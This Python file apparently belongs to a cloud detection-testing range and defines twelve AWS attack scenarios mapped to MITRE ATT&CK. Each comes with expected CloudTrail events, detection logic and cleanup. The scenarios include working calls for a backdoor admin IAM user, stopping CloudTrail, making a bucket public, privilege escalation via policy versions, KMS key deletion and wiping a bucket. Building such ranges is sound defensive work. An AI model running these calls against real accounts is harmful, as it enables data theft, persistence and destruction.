"""The 12 attack scenarios. All target data is synthetic. See docs/range-predictions.md."""
from __future__ import annotations

from .context import Context, quiet
from .scenario import scenario

FOREIGN_ACCOUNT = "999999999999"  # a made-up external account, used only for S06's bucket policy


# ---------------------------------------------------------------- S01
@scenario(
    id="S01", name="Cloud infrastructure discovery", technique="T1580", tactic="Discovery",
    description="Enumerate buckets, instances, IAM users and security groups with the stolen key.",
    expected_events=("ListBuckets", "DescribeInstances", "ListUsers", "DescribeSecurityGroups"),
    expected_detection="A single identity calling List*/Describe* across many services in a short window.",
)
def s01_discovery(ctx: Context):
    ctx.attacker("s3").list_buckets()
    ctx.attacker("ec2").describe_instances()
    ctx.attacker("iam").list_users()
    ctx.attacker("ec2").describe_security_groups()
    return {"detail": "enumerated s3, ec2 instances, iam users, security groups"}


# ---------------------------------------------------------------- S02
@scenario(
    id="S02", name="S3 data exfiltration", technique="T1530", tactic="Collection",
    description="Download every object in the data bucket.",
    expected_events=(), expected_detection="CloudTrail S3 data events: a burst of GetObject from one identity.",
    data_events=True,
)
def s02_exfiltrate(ctx: Context):
    s3 = ctx.attacker("s3")
    bucket = ctx.res["data_bucket"]
    keys = [o["Key"] for o in s3.list_objects_v2(Bucket=bucket).get("Contents", [])]
    for k in keys:
        s3.get_object(Bucket=bucket, Key=k)
    return {"detail": f"downloaded {len(keys)} objects from {bucket}"}


# ---------------------------------------------------------------- S03
def s03_cleanup(ctx: Context):
    name = ctx.state.get("backdoor_user")
    if not name:
        return
    iam = ctx.admin("iam")
    for k in quiet(lambda: iam.list_access_keys(UserName=name)["AccessKeyMetadata"]) or []:
        quiet(iam.delete_access_key, UserName=name, AccessKeyId=k["AccessKeyId"])
    quiet(iam.detach_user_policy, UserName=name, PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess")
    quiet(iam.delete_user, UserName=name)


@scenario(
    id="S03", name="Backdoor IAM user + access key", technique="T1136.003", tactic="Persistence",
    description="Create a new IAM user with AdministratorAccess and an access key: a foothold.",
    expected_events=("CreateUser", "AttachUserPolicy", "CreateAccessKey"),
    expected_detection="CreateUser immediately followed by AttachUserPolicy(AdministratorAccess) and CreateAccessKey.",
    cleanup=s03_cleanup,
)
def s03_backdoor_user(ctx: Context):
    iam = ctx.attacker("iam")
    name = f"backdoor-{ctx.run_id}"
    ctx.state["backdoor_user"] = name
    iam.create_user(UserName=name)
    iam.attach_user_policy(UserName=name, PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess")
    key = iam.create_access_key(UserName=name)["AccessKey"]["AccessKeyId"]
    return {"detail": f"created {name} with AdministratorAccess, key {key}"}


# ---------------------------------------------------------------- S04
def s04_cleanup(ctx: Context):
    name = ctx.res["trail_name"]
    quiet(ctx.admin("cloudtrail").start_logging, Name=name)


@scenario(
    id="S04", name="Disable CloudTrail logging", technique="T1562.008", tactic="Defense Evasion",
    description="Stop the account's own audit trail: an attacker trying to go dark.",
    expected_events=("StopLogging",),
    expected_detection="A StopLogging event should itself be an immediate, high-severity alert.",
    cleanup=s04_cleanup,
    destructive=True,
)
def s04_stop_logging(ctx: Context):
    ctx.attacker("cloudtrail").stop_logging(Name=ctx.res["trail_name"])
    return {"detail": f"stopped {ctx.res['trail_name']}"}


# ---------------------------------------------------------------- S05
def s05_cleanup(ctx: Context):
    quiet(ctx.admin("ec2").revoke_security_group_ingress,
          GroupId=ctx.res["victim_sg_id"],
          IpPermissions=[{"IpProtocol": "tcp", "FromPort": 22, "ToPort": 22,
                          "IpRanges": [{"CidrIp": "0.0.0.0/0"}]}])


@scenario(
    id="S05", name="Open a security group to the world", technique="T1562.007", tactic="Defense Evasion",
    description="Add an SSH-from-anywhere rule to the closed 'victim' security group.",
    expected_events=("AuthorizeSecurityGroupIngress",),
    expected_detection="An ingress rule added with CidrIp 0.0.0.0/0 and FromPort/ToPort covering 22.",
    cleanup=s05_cleanup,
)
def s05_open_sg(ctx: Context):
    ctx.attacker("ec2").authorize_security_group_ingress(
        GroupId=ctx.res["victim_sg_id"],
        IpPermissions=[{"IpProtocol": "tcp", "FromPort": 22, "ToPort": 22,
                        "IpRanges": [{"CidrIp": "0.0.0.0/0", "Description": "temporary debug access"}]}])
    return {"detail": f"opened 0.0.0.0/0:22 on {ctx.res['victim_sg_id']}"}


# ---------------------------------------------------------------- S06
def s06_cleanup(ctx: Context):
    quiet(ctx.admin("s3").delete_bucket_policy, Bucket=ctx.res["data_bucket"])


@scenario(
    id="S06", name="Backdoor bucket policy", technique="T1537", tactic="Exfiltration",
    description="Grant a foreign AWS account read access to the data bucket via its bucket policy.",
    expected_events=("PutBucketPolicy",),
    expected_detection="A bucket policy statement granting a Principal outside the organization.",
    cleanup=s06_cleanup,
)
def s06_backdoor_policy(ctx: Context):
    import json as _json
    bucket = ctx.res["data_bucket"]
    policy = {
        "Version": "2012-10-17",
        "Statement": [{
            "Sid": "ExfilAccess", "Effect": "Allow",
            "Principal": {"AWS": f"arn:aws:iam::{FOREIGN_ACCOUNT}:root"},
            "Action": ["s3:GetObject", "s3:ListBucket"],
            "Resource": [f"arn:aws:s3:::{bucket}", f"arn:aws:s3:::{bucket}/*"],
        }],
    }
    ctx.attacker("s3").put_bucket_policy(Bucket=bucket, Policy=_json.dumps(policy))
    return {"detail": f"granted {FOREIGN_ACCOUNT} read access on {bucket}"}


# ---------------------------------------------------------------- S07
def s07_cleanup(ctx: Context):
    s3 = ctx.admin("s3")
    quiet(s3.put_bucket_acl, Bucket=ctx.res["data_bucket"],
          AccessControlPolicy={"Grants": [], "Owner": quiet(lambda: s3.get_bucket_acl(Bucket=ctx.res["data_bucket"])["Owner"]) or {}})
    quiet(s3.put_public_access_block, Bucket=ctx.res["data_bucket"],
          PublicAccessBlockConfiguration={"BlockPublicAcls": True, "IgnorePublicAcls": True,
                                          "BlockPublicPolicy": True, "RestrictPublicBuckets": True})


@scenario(
    id="S07", name="Make the data bucket public", technique="T1530", tactic="Collection",
    description="Turn off Block Public Access and set a public-read ACL on the data bucket.",
    expected_events=("PutPublicAccessBlock", "PutBucketAcl"),
    expected_detection="Block Public Access disabled, or a bucket ACL granting AllUsers/AuthenticatedUsers.",
    cleanup=s07_cleanup,
)
def s07_make_public(ctx: Context):
    s3 = ctx.attacker("s3")
    bucket = ctx.res["data_bucket"]
    s3.put_public_access_block(
        Bucket=bucket,
        PublicAccessBlockConfiguration={"BlockPublicAcls": False, "IgnorePublicAcls": False,
                                        "BlockPublicPolicy": False, "RestrictPublicBuckets": False})
    s3.put_bucket_acl(Bucket=bucket, ACL="public-read")
    return {"detail": f"disabled BPA and set public-read ACL on {bucket}"}


# ---------------------------------------------------------------- S08
@scenario(
    id="S08", name="Use a leaked access key", technique="T1078.004", tactic="Initial Access",
    description="Call the API with the stolen key from a distinct, unfamiliar user agent (simulated new device).",
    expected_events=("GetCallerIdentity", "ListBuckets"),
    expected_detection="A valid key used from a user agent / source never seen for that identity before.",
)
def s08_leaked_key(ctx: Context):
    sts = ctx.attacker("sts", user_agent="aws-cli/2.17.0 unknown-laptop")
    ident = sts.get_caller_identity()
    ctx.attacker("s3", user_agent="aws-cli/2.17.0 unknown-laptop").list_buckets()
    return {"detail": f"used dev-svc key as {ident.get('Arn')} from an unfamiliar client"}


# ---------------------------------------------------------------- S09
def s09_cleanup(ctx: Context):
    iam = ctx.admin("iam")
    arn = ctx.res["intern_policy_arn"]
    versions = quiet(lambda: iam.list_policy_versions(PolicyArn=arn)["Versions"]) or []
    for v in versions:
        if not v["IsDefaultVersion"]:
            quiet(iam.delete_policy_version, PolicyArn=arn, VersionId=v["VersionId"])
    defaults = [v for v in versions if v["IsDefaultVersion"]]
    if defaults and defaults[0]["VersionId"] != "v1":
        quiet(iam.set_default_policy_version, PolicyArn=arn, VersionId="v1")


@scenario(
    id="S09", name="Privilege escalation via policy versions", technique="T1098", tactic="Privilege Escalation",
    description="As the low-privilege 'intern' user, add an admin statement to its own policy via CreatePolicyVersion.",
    expected_events=("CreatePolicyVersion", "SetDefaultPolicyVersion"),
    expected_detection="CreatePolicyVersion on a policy attached to the caller's own identity, followed by SetDefaultPolicyVersion.",
    cleanup=s09_cleanup,
)
def s09_privesc(ctx: Context):
    import json as _json
    iam = ctx.intern("iam")
    arn = ctx.res["intern_policy_arn"]
    doc = {"Version": "2012-10-17", "Statement": [
        {"Sid": "Basics", "Effect": "Allow", "Action": ["s3:ListAllMyBuckets"], "Resource": "*"},
        {"Sid": "Escalated", "Effect": "Allow", "Action": "*", "Resource": "*"},
    ]}
    v = iam.create_policy_version(PolicyArn=arn, PolicyDocument=_json.dumps(doc), SetAsDefault=True)
    ctx.state["version_id"] = v["PolicyVersion"]["VersionId"]
    # prove it: can the now-"admin" intern actually act, or does a boundary still cap it?
    try:
        ctx.intern("iam").list_users()
        proof = "post-escalation call to iam:ListUsers succeeded"
    except Exception as exc:  # noqa: BLE001 - we want the message either way
        proof = f"post-escalation call denied: {exc}"
    return {"detail": f"added Action:* to {arn} ({v['PolicyVersion']['VersionId']}); {proof}"}


# ---------------------------------------------------------------- S10
def s10_cleanup(ctx: Context):
    quiet(ctx.admin("kms").cancel_key_deletion, KeyId=ctx.res["kms_key_id"])


@scenario(
    id="S10", name="Schedule KMS key deletion", technique="T1485", tactic="Impact",
    description="Schedule deletion of the data encryption key (minimum 7-day window): a slow-fuse destroy.",
    expected_events=("ScheduleKeyDeletion",),
    expected_detection="ScheduleKeyDeletion on any customer-managed key should alert immediately.",
    cleanup=s10_cleanup,
    destructive=True,
)
def s10_schedule_key_deletion(ctx: Context):
    ctx.attacker("kms").schedule_key_deletion(KeyId=ctx.res["kms_key_id"], PendingWindowInDays=7)
    return {"detail": f"scheduled deletion of {ctx.res['kms_key_id']} in 7 days"}


# ---------------------------------------------------------------- S11
@scenario(
    id="S11", name="Harvest secrets", technique="T1555.006", tactic="Credential Access",
    description="Read the database secret's value with the stolen key.",
    expected_events=("GetSecretValue",),
    expected_detection="GetSecretValue by an identity that does not normally read that secret.",
)
def s11_harvest_secret(ctx: Context):
    val = ctx.attacker("secretsmanager").get_secret_value(SecretId=ctx.res["secret_name"])
    return {"detail": f"read secret {val.get('Name', ctx.res['secret_name'])}"}


# ---------------------------------------------------------------- S12
def s12_cleanup(ctx: Context):
    s3 = ctx.admin("s3")
    bucket = ctx.res["data_bucket"]
    quiet(s3.put_bucket_versioning, Bucket=bucket, VersioningConfiguration={"Status": "Enabled"})
    for i in range(1, 13):
        key = f"customers/record-{i:02d}.csv"
        quiet(s3.put_object, Bucket=bucket, Key=key, Body=f"synthetic customer record {key}".encode())


@scenario(
    id="S12", name="Suspend versioning and delete objects", technique="T1490", tactic="Impact",
    description="Suspend bucket versioning, then delete every object: an unrecoverable wipe without versioning.",
    expected_events=("PutBucketVersioning", "DeleteObject"),
    expected_detection="PutBucketVersioning(Suspended) immediately followed by a burst of DeleteObject.",
    cleanup=s12_cleanup,
    destructive=True,
)
def s12_wipe(ctx: Context):
    s3 = ctx.attacker("s3")
    bucket = ctx.res["data_bucket"]
    s3.put_bucket_versioning(Bucket=bucket, VersioningConfiguration={"Status": "Suspended"})
    keys = [o["Key"] for o in s3.list_objects_v2(Bucket=bucket).get("Contents", [])]
    for k in keys:
        s3.delete_object(Bucket=bucket, Key=k)
    return {"detail": f"suspended versioning and deleted {len(keys)} objects in {bucket}"}